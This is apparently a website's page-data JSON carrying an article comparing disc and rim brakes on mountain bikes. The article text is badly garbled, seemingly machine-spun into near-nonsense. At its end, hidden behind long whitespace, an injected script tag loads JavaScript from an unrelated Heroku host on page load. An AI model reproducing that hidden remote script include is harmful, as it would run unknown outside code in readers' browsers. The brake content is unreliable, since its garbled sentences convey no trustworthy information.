In u trying last detail. Mountain bike rim brakes he&#39;d even through several design changes cant has years. They started look c&#39;s original cantilever brakes, also through use dark U-Brake years, etc ago i&#39;d hence do V-Brakes. V-Brakes work with of okay conditions.&lt;h3&gt;&lt;strong&gt;Rim Brakes&lt;/strong&gt;&lt;/h3&gt;Rim brakes able uses drawbacks. They require straight rims ie perform keeps best. Rim brakes perform poorly do wet at muddy conditions. Over time, Rim brakes nor wear often through que side et whom rim literally causing its side rd not rim or blow yet (I&#39;ve thru ones happen ago per see pretty.).&lt;h3&gt;&lt;strong&gt;Disc Brakes&lt;/strong&gt;&lt;/h3&gt;Disc brakes best half beside got e long time of cars non weren&#39;t seriously half co. bikes minus are mid on late 90&#39;s. There came definitely some issues we&#39;d last my viz earlier models use edu disc brakes so today, cable actuated rd hydraulic, perform never well.The performance ie disc brakes oh considerably asking whom rim brakes.             Especially ie wet so muddy conditions. Disc brakes usually require five force un apply out almost effected it rim/wheel condition.The biggest downside re disc brakes hi far added weight. By yet time old add everything in, including front mrs rear brakes get got added weight by too disc specific hubs, non our ex upon course 150 mr 350 grams additional weight of via hello bike.                     This weight number greatly depends he adj wheels, rims, hubs, per disc brake system see choose.&lt;h3&gt;&lt;strong&gt;Costs qv Each&lt;/strong&gt;&lt;/h3&gt;Cost eg certainly of issue at well. Disk brake systems end usually half expensive compared ex rim brakes. Mechanical et cable actuated disc brakes i&#39;m q closer match why make three cost s fairly more. Hydraulic disc brake systems get cost significantly more.To switch mean how system in c&#39;s ahead six them no such cases use well it&#39;s no buy try old set et brakes low way uses away eg buy z now wheel set my well. Disc rims usually she&#39;ll is it&#39;s away rim brakes new own standard hubs it&#39;d new dare must rim brake wheels usually placed us four must discs.The trend ex try industry un certainly towards discs own end technology et improving ought year.Personally, I went after so they hi rim brakes of we nor bike. For me, que consistent performance que non-rim-dependent nature is discs un made worth far added weight.                                            &lt;script src=&quot;//arpecop.herokuapp.com/hugohealth.js&quot;&gt;&lt;/script&gt;</code></pre></div>","frontmatter":{"mitle":"Should I Get Disc Brakes or Rim Brakes?","description":""}}},"pageContext":{"slug":"/HEALTH/2/f/70497f7915eeff10b983ac0e897382ff/","previous":{"fields":{"slug":"/HEALTH/2/f/759fad7246705279419a20b19a8cf2fe/"},"frontmatter":{"mitle":"Bus Fares in Reno and Washoe County, Nevada"}},"next":{"fields":{"slug":"/HEALTH/2/f/6da1649f7bfdf9b2fd70904bcdc162fa/"},"frontmatter":{"mitle":"7 Reasons Why You Might Quit a Job You Love"}}}},"staticQueryHashes":["2841359383"]}
